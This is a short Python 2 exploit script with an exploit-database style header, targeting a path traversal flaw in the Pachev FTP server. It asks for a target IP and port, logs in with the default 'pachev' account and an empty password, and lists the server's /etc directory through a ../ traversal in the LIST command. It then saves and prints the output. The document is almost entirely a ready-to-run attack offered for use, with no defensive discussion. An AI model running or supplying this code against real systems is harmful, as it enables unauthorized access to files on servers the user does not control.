# Exploit Title: Pachev FTP Server Path Traversal & Directory Listing
# Date: 2020-04-02
# Vulnerability: Path Traversal
# Original Exploit Author: 1F98D
# Vendor Homepage: https://github.com/pachev/pachev_ftp

from ftplib import FTP

ip = raw_input("Target IP: ")
port = int(raw_input("Target Port: "))

ftp = FTP()
ftp.connect(host=ip, port=port)
ftp.login('pachev', '')                   
ftp.retrlines('LIST ../../../../../../../../etc/', open('listing.txt', 'wb').write)
ftp.close()
file = open('listing.txt', 'r')
print "[**] Printing the contents of directory"
print file.read()
            
